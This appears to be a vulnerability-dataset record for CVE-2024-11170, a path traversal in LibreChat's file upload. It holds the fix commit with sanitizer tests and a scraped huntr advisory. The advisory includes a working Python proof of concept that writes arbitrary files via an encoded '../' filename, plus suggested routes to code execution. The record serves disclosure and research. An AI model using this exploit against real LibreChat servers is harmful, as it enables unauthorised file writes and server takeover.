{
    "CVE-2024-11170": {
        "published_date": "2025-03-20T10:08:59.584Z",
        "patch_commits": [
            {
                "url": "https://github.com/danny-avila/librechat/commit/629be5c0ca2b332178524b4e3f6fac715aea8cc4",
                "content": "fix: add filename sanitization utility and integrate it into multer storage configuration\n\nFilename: api/server/routes/files/multer.js:\n```\n@@ -3,6 +3,7 @@\nconst path = require('path');\n const crypto = require('crypto');\n const multer = require('multer');\n const { fileConfig: defaultFileConfig, mergeFileConfig } = require('librechat-data-provider');\n+const { sanitizeFilename } = require('~/server/utils/handleText');\n const { getCustomConfig } = require('~/server/services/Config');\n \n const storage = multer.diskStorage({\n\n@@ -16,7 +17,7 @@\nconst storage = multer.diskStorage({\n   filename: function (req, file, cb) {\n     req.file_id = crypto.randomUUID();\n     file.originalname = decodeURIComponent(file.originalname);\n-    const sanitizedFilename = path.basename(file.originalname);\n+    const sanitizedFilename = sanitizeFilename(file.originalname);\n     cb(null, sanitizedFilename);\n   },\n });\n```\n\nFilename: api/server/utils/handleText.js:\n```\n@@ -1,3 +1,5 @@\n+const path = require('path');\n+const crypto = require('crypto');\n const {\n   Capabilities,\n   EModelEndpoint,\n\n@@ -222,6 +224,38 @@\nfunction normalizeEndpointName(name = '') {\n   return name.toLowerCase() === Providers.OLLAMA ? Providers.OLLAMA : name;\n }\n \n+/**\n+ * Sanitize a filename by removing any directory components, replacing non-alphanumeric characters\n+ * @param {string} inputName\n+ * @returns {string}\n+ */\n+function sanitizeFilename(inputName) {\n+  // Remove any directory components\n+  let name = path.basename(inputName);\n+\n+  // Replace any non-alphanumeric characters except for '.' and '-'\n+  name = name.replace(/[^a-zA-Z0-9.-]/g, '_');\n+\n+  // Ensure the name doesn't start with a dot (hidden file in Unix-like systems)\n+  if (name.startsWith('.') || name === '') {\n+    name = '_' + name;\n+  }\n+\n+  // Limit the length of the filename\n+  const MAX_LENGTH = 255;\n+  if (name.length > MAX_LENGTH) {\n+    const ext = path.extname(name);\n+    const nameWithoutExt = path.basename(name, ext);\n+    name =\n+      nameWithoutExt.slice(0, MAX_LENGTH - ext.length - 7) +\n+      '-' +\n+      crypto.randomBytes(3).toString('hex') +\n+      ext;\n+  }\n+\n+  return name;\n+}\n+\n module.exports = {\n   isEnabled,\n   handleText,\n\n@@ -231,5 +265,6 @@\nmodule.exports = {\n   generateConfig,\n   addSpaceIfNeeded,\n   createOnProgress,\n+  sanitizeFilename,\n   normalizeEndpointName,\n };\n```\n\nFilename: api/server/utils/handleText.spec.js:\n```\n@@ -1,4 +1,4 @@\n-const { isEnabled } = require('./handleText');\n+const { isEnabled, sanitizeFilename } = require('./handleText');\n \n describe('isEnabled', () => {\n   test('should return true when input is \"true\"', () => {\n\n@@ -49,3 +49,51 @@\ndescribe('isEnabled', () => {\n     expect(isEnabled([])).toBe(false);\n   });\n });\n+\n+jest.mock('crypto', () => ({\n+  randomBytes: jest.fn().mockReturnValue(Buffer.from('abc123', 'hex')),\n+}));\n+\n+describe('sanitizeFilename', () => {\n+  test('removes directory components (1/2)', () => {\n+    expect(sanitizeFilename('/path/to/file.txt')).toBe('file.txt');\n+  });\n+\n+  test('removes directory components (2/2)', () => {\n+    expect(sanitizeFilename('../../../../file.txt')).toBe('file.txt');\n+  });\n+\n+  test('replaces non-alphanumeric characters', () => {\n+    expect(sanitizeFilename('file name@#$.txt')).toBe('file_name___.txt');\n+  });\n+\n+  test('preserves dots and hyphens', () => {\n+    expect(sanitizeFilename('file-name.with.dots.txt')).toBe('file-name.with.dots.txt');\n+  });\n+\n+  test('prepends underscore to filenames starting with a dot', () => {\n+    expect(sanitizeFilename('.hiddenfile')).toBe('_.hiddenfile');\n+  });\n+\n+  test('truncates long filenames', () => {\n+    const longName = 'a'.repeat(300) + '.txt';\n+    const result = sanitizeFilename(longName);\n+    expect(result.length).toBe(255);\n+    expect(result).toMatch(/^a+-abc123\\.txt$/);\n+  });\n+\n+  test('handles filenames with no extension', () => {\n+    const longName = 'a'.repeat(300);\n+    const result = sanitizeFilename(longName);\n+    expect(result.length).toBe(255);\n+    expect(result).toMatch(/^a+-abc123$/);\n+  });\n+\n+  test('handles empty input', () => {\n+    expect(sanitizeFilename('')).toBe('_');\n+  });\n+\n+  test('handles input with only special characters', () => {\n+    expect(sanitizeFilename('@#$%^&*')).toBe('_______');\n+  });\n+});\n```"
            }
        ],
        "sw_version": "v0.7.6-rc1",
        "sw_version_wget": "https://github.com/danny-avila/librechat/archive/refs/tags/v0.7.6-rc1.zip",
        "description": "A vulnerability in danny-avila/librechat version git 81f2936 allows for path traversal due to improper sanitization of file paths by the multer middleware. This can lead to arbitrary file write and potentially remote code execution. The issue is fixed in version 0.7.6.",
        "sec_adv": [
            {
                "url": "https://huntr.com/bounties/b64156c2-5380-4d4d-af30-b2938dcdd46e",
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nmulter(file upload middleware in express) misused, lead to remote code execution in danny-avila/librechat\nValid\nReported on Nov 7th 2024\nDescription\nLibrechat use multer to handle multi-part file upload. multer library will deal with '../' kind of path traversal, then let the programmer decide the actual filename, then join the path to write the upload the file. this means, if '../' is provided by the user of librechat, multer will filter that. But if '../' is introduced by the programmer, multer will not sanitize that. In librechat, programmer decide the filename should be:\nfilename: function (req, file, cb) {\n    req.file_id = crypto.randomUUID();\n    file.originalname = decodeURIComponent(file.originalname);\n    cb(null, `${file.originalname}`);\n  },\nSo if use set the filename to be like '..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2ftmp%2fpoc', multer will not sanitize that, then programmer with change the filename to be '../../../../../tmp/poc', which lead to path traversal, arbitrary file write. Arbitrary file write can always lead to remote code execution. There are many ways of doing that, such as overwrite rc.local crontab linux infrastructure, overwriting ssh keys, or overwrite the javascript code of librechat itself.\nProof of Concept\nUse this poc to exploit the vulnerability. Any unprivileged user can exploit the vulnerability\nimport requests\nimport random\nimport string\nimport urllib.parse\n\n\nserver_url = \"127.0.0.1\"\nfile_path = \"/tmp/poc\"\nfile_content = \"1234\"\n\ndef create_multipart_content(boundary, file_size, chunk_size=409600):\n    yield f'--{boundary}\\r\\n'.encode('utf-8')\n    yield (\n        f'Content-Disposition: form-data; name=\"input\"; filename=\"avatar.png\"\\r\\n'\n        f'Content-Type: image/png\\r\\n\\r\\n'\n    ).encode('utf-8')\n    remaining = file_size\n    while remaining > 0:\n        current_chunk_size = min(chunk_size, remaining)\n        yield b'\\x00' * current_chunk_size\n        remaining -= current_chunk_size\n    yield b'\\r\\n'\n    yield f'--{boundary}--\\r\\n'.encode('utf-8')\nrandom_string = ''.join(random.choices(string.ascii_letters, k=8))\nurl1 = f'http://{server_url}:3080/api/auth/register'\nurl2 = f'http://{server_url}:3080/api/auth/login'\nurl3 = f\"http://{server_url}:3080/api/files/images\"\ndata = {\n    \"name\": random_string,\n    \"username\": random_string,\n    \"email\": f\"{random_string}@{random_string}.com\",\n    \"password\": random_string,\n    \"confirm_password\": random_string\n}\nheaders = {\n    \"X-Forwarded-For\": random_string\n}\nrequests.post(url1, json=data, headers=headers)\ndata = {\"email\":f\"{random_string}@{random_string}.com\",\"password\":random_string}\nresp = requests.post(url2, json=data, headers=headers)\ntoken = resp.json()[\"token\"]\n\nheaders = {\n    'Authorization': f'Bearer {token}',\n    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',\n}\nfiles = {\n    'file': (urllib.parse.quote('../../../../../../../../../../../../../..'+file_path, safe=''), file_content, 'image/png'),\n}\nresponse = requests.post(url3, files=files, headers=headers)\nImpact\nArbitrary file write on the server. Arbitrary file write can always lead to remote code execution. There are many ways of doing that, such as overwrite rc.local crontab linux infrastructure, overwriting ssh keys, or overwrite the javascript code of librechat itself.\nOccurrences\nmulter.js L16-L20\nWe are processing your report and will contact thedanny-avila/librechat team within 24 hours.6 months ago\nhuntr-helpermodified the Severity from Critical (9.8) to High (8.8)6 months ago\nThe researcher has received a minor penalty to their credibility for miscalculating the severity: -1\nDanny Avila validated this vulnerability6 months ago\noicu0619has been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2024-11170assigned to this report.6 months ago\nDanny Avilamarked this as fixedin 0.7.6with commit629be56 months ago\nDanny Avilahas been awarded the fix bounty\nmulter.js#L16-L20 has been validated\nWe have sent a warning to the danny-avila/librechat team to inform them that this report will be published in 48 hours3 months ago\nThis vulnerability has now been published3 months ago\nCVE-2024-11170has now been published2 months ago\nSign in to join this conversation\nCVE\nCVE-2024-11170\n(Published)\nVulnerability Type\nCWE-29: Path Traversal: '\\..\\filename'\nSeverity\nHigh (8.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator\nRegistry\nNpm\nAffected Version\ngit 81f2936\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$450\nFix Bounty\n$112.5\nFound by\nFixed by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\nÂ© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "Yes, the advisory includes a proof of concept script clearly outlining the steps and methodology to exploit the vulnerability."
            }
        ],
        "cwe": [
            {
                "id": "CWE-29",
                "value": "CWE-29 Path Traversal: '\\..\\filename'"
            }
        ]
    }
}